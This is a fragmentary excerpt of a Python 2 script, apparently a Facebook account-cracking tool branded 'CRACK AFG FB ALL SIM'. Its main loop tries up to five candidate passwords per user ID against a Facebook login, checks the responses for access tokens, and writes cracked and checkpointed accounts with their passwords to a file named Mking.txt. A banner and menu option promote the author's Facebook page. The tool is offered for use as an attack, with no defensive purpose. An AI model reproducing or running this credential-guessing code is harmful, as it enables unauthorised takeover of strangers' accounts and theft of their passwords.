...
Mking_youtube = random.choice(["https://www.facebook.com/TANVIRurDAD1"])

youtuber = Mking_youtube

def youtube():
	Style_profaisor("  please Follow My Page author :) Thank you")
	os.system("xdg-open https://www.facebook.com/TANVIRurDAD13")
	menu()
...
#Mking Logo
logo ="""
\033[1;91m    .TANVIR\033[1;0m
\033[1;91m    .HOSSAIN .\033[1;0m
\033[1;97m    .NAYEEM\033[1;0m
\033[1;97m    .FOLLOW ME ON FACEBOOM\033[1;0m
\033[1;91m    .https://www.facebook.com/TANVIRurDAD1.\033[1;0m
\033[1;91m    .####.####.####.####.######. \033[1;0m
\033[1;97m    .########################\033[1;0m
\033[1;97m----------------------------------------------------------------
\033[1;91m    Author      : TANVIR HOSSAIN 
\033[1;91m    GitHub      : https://github.com/WG-TANVIR
\033[1;91m    Facebook : TANVIR HOSSAIN 
\033[1;91m    Fb Page    : Tanvir Hossain
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY TANVIR HOSSAIN '
        print '\x1b[1;92m THISE SCRIPT CREATED BY TANVIR HOSSAIN  '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[TANVIR_OK] ' + k + c + user + ' | ' + pass1
                okb = open('Mking.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[TANVIR_CP] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[TANVIR_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Mking.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[TANVIR_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[TANVIR_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Mking.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[TANVIR_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('Mking.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[TANVIR_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Mking.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[TANVIR_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('Mking.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[TANVIR_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Mking.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[TANVIR_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('Mking.txt', 'a')
